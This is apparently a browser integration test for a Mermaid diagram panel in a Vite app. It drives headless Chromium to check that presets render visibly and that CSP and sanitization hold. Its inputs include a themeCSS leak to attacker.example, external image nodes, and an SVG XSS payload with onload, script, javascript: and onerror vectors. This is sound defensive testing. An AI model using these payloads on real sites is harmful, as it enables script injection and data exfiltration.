// Integration regression: run the real Vite app in headless Chromium.
import assert from "node:assert/strict"
import { spawn } from "node:child_process"
import { mkdtemp, readFile, rm } from "node:fs/promises"
import { createServer } from "node:net"
import { tmpdir } from "node:os"
import { join } from "node:path"

async function freePort() {
  const server = createServer()
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve))
  const port = server.address().port
  await new Promise((resolve) => server.close(resolve))
  return port
}
async function waitFor(fn, timeout = 60000) {
  const end = Date.now() + timeout
  let error
  while (Date.now() < end) {
    try { const result = await fn(); if (result) return result } catch (e) { error = e }
    await new Promise((resolve) => setTimeout(resolve, 100))
  }
  throw error ?? new Error("Timed out waiting for browser/server")
}

const port = await freePort()
const profile = await mkdtemp(join(tmpdir(), "mermaid-security-"))
const vite = spawn(process.execPath, ["node_modules/vite/bin/vite.js", "--host", "127.0.0.1", "--port", String(port), "--strictPort"], { stdio: "ignore", env: { ...process.env, __VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS: "insecure.test" } })
const browser = spawn(process.env.CHROMIUM_BIN ?? "chromium", ["--headless", "--no-sandbox", "--disable-gpu", "--no-proxy-server", "--host-resolver-rules=MAP insecure.test 127.0.0.1, MAP attacker.example 127.0.0.1", "--remote-debugging-port=0", `--user-data-dir=${profile}`, "about:blank"], { stdio: "ignore" })
try {
  await waitFor(async () => (await fetch(`http://127.0.0.1:${port}`)).ok)
  const debugPort = await waitFor(async () => (await readFile(join(profile, "DevToolsActivePort"), "utf8")).split("\n")[0])
  const target = await (await fetch(`http://127.0.0.1:${debugPort}/json/new?http://127.0.0.1:${port}/`, { method: "PUT" })).json()
  const socket = new WebSocket(target.webSocketDebuggerUrl)
  await new Promise((resolve, reject) => { socket.onopen = resolve; socket.onerror = reject })
  let seq = 0
  const pending = new Map()
  const requests = []
  const exceptions = []
  socket.onmessage = ({ data }) => {
    const msg = JSON.parse(data)
    if (msg.method === 'Network.requestWillBeSent') requests.push({ id: msg.params.requestId, url: msg.params.request.url })
    if (msg.method === 'Network.loadingFailed') { const request = requests.find(r => r.id === msg.params.requestId); if (request) request.failure = msg.params }
    if (!msg.id) { if (msg.method === 'Runtime.exceptionThrown') { exceptions.push(msg.params.exceptionDetails); console.error('Browser exception:', JSON.stringify(msg.params.exceptionDetails)) }; return }
    const waiter = pending.get(msg.id)
    pending.delete(msg.id)
    if (msg.error) waiter.reject(new Error(JSON.stringify(msg.error)))
    else waiter.resolve(msg.result)
  }
  function call(method, params = {}) {
    const id = ++seq
    return new Promise((resolve, reject) => { pending.set(id, { resolve, reject }); socket.send(JSON.stringify({ id, method, params })) })
  }
  async function evaluate(expression) {
    const result = await call("Runtime.evaluate", { expression, awaitPromise: true, returnByValue: true })
    if (result.exceptionDetails) throw new Error(result.exceptionDetails.exception?.description ?? result.exceptionDetails.text)
    return result.result.value
  }
  await call("Runtime.enable")
  await call("Network.enable")
  // Requests are constrained by the app CSP; map the test domain locally as a
  // second safety net rather than masking CSP failures with DevTools blocking.
  await call("Network.setBlockedURLs", { urls: [] })
  let benign
  try {
    benign = await waitFor(async () => {
      const text = await evaluate('document.querySelector(".mermaid svg")?.textContent ?? ""')
      return text.includes("Pele") ? text : null
    }, 60000)
  } catch (error) {
    console.error("Mermaid panel:", await evaluate('document.querySelector(".mermaid")?.parentElement?.outerHTML.slice(0, 2000)'))
    console.error("Document:", await evaluate('({url:location.href,html:document.documentElement.outerHTML.slice(0,3000)})'))
    throw error
  }
  assert.match(benign, /Pele/)
  assert.ok(await evaluate(`document.querySelector('link[rel="icon"]').href.startsWith('data:image/svg+xml,')`), 'favicon must remain usable under the image CSP')
  const colors = await evaluate(`(() => { const panel = document.querySelector('.mermaid'); const box = panel.querySelector('.node rect'); const text = panel.querySelector('.node text'); return { box: getComputedStyle(box).fill, text: getComputedStyle(text).fill }; })()`)
  assert.notEqual(colors.box, colors.text, `flowchart label must contrast with its node: ${JSON.stringify(colors)}`)
  console.log("PASS real Mermaid flowchart renders visible label")

  // Exercise real mermaid.render with untrusted source; observe requests, including
  // those initiated before the render promise resolves and before SVG sanitization.
  const maliciousSource = `---\nconfig:\n  themeCSS: '.node rect { fill: url(https://attacker.example/theme-leak) }'\n---\nflowchart LR\n  AttackMarker --> SafeNode`
  await evaluate(`(() => { const input=document.querySelector('textarea'); const setter=Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set; setter.call(input, ${JSON.stringify(maliciousSource)}); input.dispatchEvent(new Event('input',{bubbles:true})); })()`)
  await waitFor(async () => evaluate(`document.querySelector('.mermaid svg')?.textContent.includes('AttackMarker')`), 30000)
  await new Promise(resolve => setTimeout(resolve, 300))
  const profileConfig = await evaluate(String.raw`(async () => {
    const text = await (await fetch('/src/components/MermaidPanel.tsx')).text();
    const path = text.match(/from\s+"([^\"]*\/mermaid\.js\?v=[^\"]+)"/)[1];
    return (await import(path)).default.mermaidAPI.getConfig();
  })()`)
  assert.equal(profileConfig.themeCSS, undefined, 'source CSS reached Mermaid config')
  assert.deepEqual(requests.filter(r => r.url.includes('theme-leak')), [], 'themeCSS must not reach the temporary rendering DOM')
  console.log('PASS Mermaid source cannot trigger external CSS requests')
  const styledSource = `flowchart LR\n  ImageAttack@{ img: "https://attacker.example/image", label: "ImageAttack", w: 60, h: 60 } --> Target`
  await evaluate(`(() => { const input=document.querySelector('textarea'); const setter=Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set; setter.call(input, ${JSON.stringify(styledSource)}); input.dispatchEvent(new Event('input',{bubbles:true})); })()`)
  await new Promise(resolve => setTimeout(resolve, 1500))
  assert.ok(requests.some(r => r.url.includes('/image') && r.failure?.blockedReason === 'csp'), 'image attack must reach and be blocked by CSP')
  assert.deepEqual(requests.filter(r => r.url.includes('attacker.example') && r.failure?.blockedReason !== 'csp'), [], 'image node triggered network before sanitization')
  console.log('PASS image node cannot trigger external requests')

  // Positive control proves same-origin network observation is live; unlike an
  // image blocked by CSP, this fetch must reach the Vite server.
  const control = await evaluate(`fetch('/mermaid-network-control').then(r => r.status)`)
  assert.equal(control, 200)
  assert.ok(requests.some(r => r.url.endsWith('/mermaid-network-control') && !r.failure), 'network observer missed control')
  const localImage = `flowchart LR\n  LocalImage@{ img: "/mermaid-local-request", label: "LocalImage", w: 60, h: 60 } --> Target`
  await evaluate(`(() => { const input=document.querySelector('textarea'); const setter=Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set; setter.call(input, ${JSON.stringify(localImage)}); input.dispatchEvent(new Event('input',{bubbles:true})); })()`)
  await waitFor(async () => evaluate(`document.querySelector('textarea').value.includes('LocalImage')`), 30000)
  await new Promise(resolve => setTimeout(resolve, 1500))
  assert.ok(requests.some(r => r.url.includes('/mermaid-local-request') && r.failure?.blockedReason === 'csp'), 'local image must reach renderer and be blocked by CSP')
  assert.deepEqual(requests.filter(r => r.url.includes('/mermaid-local-request') && r.failure?.blockedReason !== 'csp'), [], 'same-origin image reached network before sanitization')
  console.log('PASS same-origin image cannot reach network before sanitization')

  // Real browser exercises each shipped diagram, not just the sanitizer substitute.
  const presets = [['Flowchart', 'Pele'], ['Sequence', 'Developer'], ['Gantt', 'Diagram race'], ['Mindmap', 'Pele Diagram Race'], ['Sankey', 'Bundle'], ['Class', 'Renderer'], ['State', 'Editing']]
  const edgeSelectors = { Flowchart: '.edgePaths > path', Sequence: 'line[class^="messageLine"]', Gantt: '.grid .tick line', Mindmap: '.edgePaths > path', Sankey: '.link > path', Class: '.edgePaths > path', State: '.edgePaths > path' }
  for (const [name, label] of presets) {
    await evaluate(`Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === ${JSON.stringify(name)}).click()`)
    try {
      const summary = await waitFor(async () => evaluate(`(() => { const svg=document.querySelector('.mermaid svg'); const label=${JSON.stringify(label)}; if (!svg?.textContent?.includes(label)) return null; const text=[...svg.querySelectorAll('text')].find(n=>n.textContent.includes(label)); return text ? {fill:getComputedStyle(text).fill, box:text.getBBox().width} : null })()`), 30000)
      assert.notEqual(summary.fill, 'rgba(0, 0, 0, 0)', `${name} text is transparent`)
      assert.ok(summary.box > 0, `${name} text has no width`)
      if (['Flowchart', 'State', 'Gantt'].includes(name)) {
        for (const taskLabel of name === 'Gantt' ? ['Scaffold', 'Build'] : [label]) {
        const overlap = await evaluate(`(() => { const svg=document.querySelector('.mermaid svg'); const text=[...svg.querySelectorAll('text')].find(n=>n.textContent.includes(${JSON.stringify(taskLabel)})); const t=text.getBoundingClientRect(); const center={x:t.x+t.width/2,y:t.y+t.height/2}; const shapes=[...svg.querySelectorAll('rect,polygon,path')].map(n=>{const b=n.getBoundingClientRect();return {tag:n.tagName, cls:n.getAttribute('class'), fill:getComputedStyle(n).fill, x:b.x,y:b.y,w:b.width,h:b.height}}).filter(b=>b.w>0 && b.h>0 && b.x<=center.x && center.x<=b.x+b.w && b.y<=center.y && center.y<=b.y+b.h && b.fill!=='none' && b.fill!=='rgba(0, 0, 0, 0)'); return {text:getComputedStyle(text).fill, shapes}; })()`)
        assert.ok(overlap.shapes.length > 0, `${name} label has no background: ${JSON.stringify(overlap)}`)
        assert.notEqual(overlap.text, overlap.shapes.at(-1).fill, `${name} ${taskLabel} label must contrast with its background: ${JSON.stringify(overlap)}`)
        }
      }
      const edges = await evaluate(`(() => [...document.querySelectorAll('.mermaid svg ' + ${JSON.stringify(edgeSelectors[name])})].map(n => ({ stroke:getComputedStyle(n).stroke, width:parseFloat(getComputedStyle(n).strokeWidth), opacity:parseFloat(getComputedStyle(n).opacity), length: n.getTotalLength ? n.getTotalLength() : Math.hypot(n.x2.baseVal.value-n.x1.baseVal.value,n.y2.baseVal.value-n.y1.baseVal.value) })))()`)
      assert.ok(edges.length > 0, `${name} has no edges/grid lines`)
      assert.ok(edges.every(e => e.stroke !== 'none' && e.stroke !== 'rgba(0, 0, 0, 0)' && e.width > 0 && e.opacity > 0 && e.length > 0), `${name} invisible edges: ${JSON.stringify(edges)}`)
      console.log(`PASS ${name} preset visible text and ${edges.length} edges/grid lines`)
    } catch (error) {
      console.error(`FAIL ${name} preset:`, await evaluate(`document.querySelector('.mermaid')?.parentElement?.textContent`))
      throw error
    }
  }

  await evaluate(`Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === 'Flowchart').click()`)
  await waitFor(async () => evaluate(`document.querySelector('.mermaid svg')?.textContent.includes('mermaid.js')`), 30000)
  await evaluate(String.raw`(async () => { const text = await (await fetch('/src/components/MermaidPanel.tsx')).text(); const path = text.match(/from\s+"([^\"]*\/mermaid\.js\?v=[^\"]+)"/)[1]; const m=(await import(path)).default; const original=m.render; window.__raceRenderCount=0; m.render=(...args)=>{ if (String(args[0]).startsWith('race-')) window.__raceRenderCount++; return original(...args); }; })()`)
  await evaluate(`Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Race')).click()`)
  await waitFor(async () => evaluate(`document.body.textContent.includes('Avg over 50:')`), 120000)
  assert.equal(await evaluate(`window.__raceRenderCount`), 50, 'benchmark must actually perform 50 Mermaid renders')
  const raceConfig = await evaluate(String.raw`(async () => {
    const text = await (await fetch('/src/components/MermaidPanel.tsx')).text();
    const path = text.match(/from\s+"([^"]*\/mermaid\.js\?v=[^"]+)"/)[1];
    return (await import(path)).default.mermaidAPI.getConfig();
  })()`)
  assert.equal(raceConfig.securityLevel, 'strict')
  assert.equal(raceConfig.htmlLabels, false, 'race must not reset safe label configuration')
  console.log('PASS race retains safe Mermaid configuration')
  // Image loads during the benchmark must remain blocked too.
  const raceImage = localImage.replaceAll('/mermaid-local-request', '/mermaid-race-request')
  await evaluate(`(() => { const input=document.querySelector('textarea'); const setter=Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set; setter.call(input, ${JSON.stringify(raceImage)}); input.dispatchEvent(new Event('input',{bubbles:true})); })()`)
  await waitFor(async () => requests.some(r => r.url.includes('/mermaid-race-request') && r.failure?.blockedReason === 'csp'), 30000)
  const beforeRace = requests.filter(r => r.url.includes('/mermaid-race-request')).length
  await evaluate(`Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Race')).click()`)
  await waitFor(async () => requests.filter(r => r.url.includes('/mermaid-race-request')).length > beforeRace, 30000)
  await waitFor(async () => evaluate(`!Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Race') || b.textContent.includes('Racing'))?.disabled`), 120000)
  await new Promise(resolve => setTimeout(resolve, 300))
  const allowedNetwork = request => request.failure?.blockedReason === 'csp'
  assert.ok(!allowedNetwork({ url: `http://127.0.0.1:${port}/mermaid-race-request` }), 'network assertion must reject an unblocked request')
  assert.deepEqual(requests.filter(r => r.url.includes('/mermaid-race-request') && !allowedNetwork(r)), [], 'same-origin image reached network during race')
  assert.ok(await evaluate(`document.querySelector('.mermaid')?.parentElement?.textContent.includes('decoded')`), 'blocked image must surface the renderer error')
  assert.ok(await evaluate(`document.body.textContent.includes('Race failed:') && !document.body.textContent.includes('Avg over 50:')`), 'failed benchmark must not show stale averages')
  assert.equal(exceptions.length, 0, 'failed benchmark must not create an unhandled rejection')
  console.log('PASS same-origin image blocked during race (renderer reports decode failure)')
  // Repeat the real source attack after race reinitialization.
  await evaluate(`(() => { const input=document.querySelector('textarea'); const setter=Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set; setter.call(input, ${JSON.stringify(maliciousSource.replaceAll('AttackMarker', 'AfterRaceMarker').replaceAll('theme-leak', 'race-leak'))}); input.dispatchEvent(new Event('input',{bubbles:true})); })()`)
  await waitFor(async () => evaluate(`document.querySelector('.mermaid svg')?.textContent.includes('AfterRaceMarker')`), 30000)
  await new Promise(resolve => setTimeout(resolve, 300))
  assert.deepEqual(requests.filter(r => r.url.includes('race-leak')), [], 'race reinitialization weakened themeCSS protection')
  await evaluate(`Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Race')).click()`)
  await waitFor(async () => evaluate(`!Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Race') || b.textContent.includes('Racing'))?.disabled`), 120000)
  assert.deepEqual(requests.filter(r => r.url.includes('race-leak')), [], 'malicious race triggered themeCSS request')
  console.log('PASS themeCSS remains blocked after and during race')

  // Replace only the library result: this checks the production component's SVG sink,
  // independently of which payloads a particular Mermaid parser happens to emit.
  const result = await evaluate(String.raw`(async () => {
    const React = (await import('/node_modules/.vite/deps/react.js')).default;
    const { createRoot } = (await import('/node_modules/.vite/deps/react-dom_client.js')).default;
    const componentUrl = '/src/components/MermaidPanel.tsx';
    const componentText = await (await fetch(componentUrl)).text();
    const mermaidPath = componentText.match(/from\s+"([^"]*\/mermaid\.js\?v=[^"]+)"/)[1];
    const { default: mermaid } = await import(mermaidPath);
    const { MermaidPanel } = await import(componentUrl);
    const original = mermaid.render;
    const payload = ${JSON.stringify('<svg xmlns="http://www.w3.org/2000/svg" onload="window.__xss=1" style="background:url(https://attacker.example/leak)"><style>@import url(https://attacker.example/leak);</style><script>window.__xss=2</script><a href="javascript:window.__xss=3"><text>safe label</text></a><foreignObject><img xmlns="http://www.w3.org/1999/xhtml" src="x" onerror="window.__xss=4"/></foreignObject></svg>')};
    let calls = 0;
    mermaid.render = async () => { calls++; return { svg: payload }; };
    const host = document.createElement('div'); document.body.append(host);
    const root = createRoot(host);
    await new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error('mock render timeout')), 10000);
      root.render(React.createElement(MermaidPanel, { source: 'flowchart LR; A-->B', onRendered: () => { clearTimeout(timer); resolve(); } }));
    });
    await new Promise(r => setTimeout(r, 200));
    const svg = host.querySelector('svg');
    const result = { calls, svg: svg?.outerHTML, text: svg?.textContent, ran: window.__xss ?? 0, securityLevel: mermaid.mermaidAPI.getConfig().securityLevel };
    root.unmount(); host.remove(); mermaid.render = original;
    return result;
  })()`)
  assert.ok(result.calls > 0, "malicious substitute must be called")
  assert.ok(result.svg, "sanitized diagram must remain an SVG")
  assert.match(result.text, /safe label/)
  assert.equal(result.ran, 0, "injected SVG executed script")
  assert.doesNotMatch(result.svg, /<script|<style|style=|onload=|onerror=|javascript:|attacker\.example/i)
  assert.equal(result.securityLevel, "strict")
  console.log("PASS malicious SVG sanitized, text retained, Mermaid strict")

  await call('Page.enable')
  await call('Page.navigate', { url: `http://insecure.test:${port}/` })
  await waitFor(async () => evaluate(`location.hostname === 'insecure.test' && document.readyState === 'complete'`), 30000)
  const context = await evaluate(`({ secure: isSecureContext, uuid: typeof crypto.randomUUID, body: document.body.textContent.slice(0, 120) })`)
  assert.equal(context.secure, false, JSON.stringify(context))
  assert.equal(context.uuid, 'undefined', JSON.stringify(context))
  try { await waitFor(async () => evaluate(`document.querySelector('.mermaid svg')?.textContent.includes('Pele')`), 10000) }
  catch (error) { console.error('Insecure page:', await evaluate('document.body.innerText')); throw error }
  console.log('PASS rendering on non-secure HTTP without crypto.randomUUID')
  socket.close()
} finally {
  vite.kill(); browser.kill()
  await Promise.all([new Promise(resolve => vite.once('exit', resolve)), new Promise(resolve => browser.once('exit', resolve))])
  await rm(profile, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 })
}
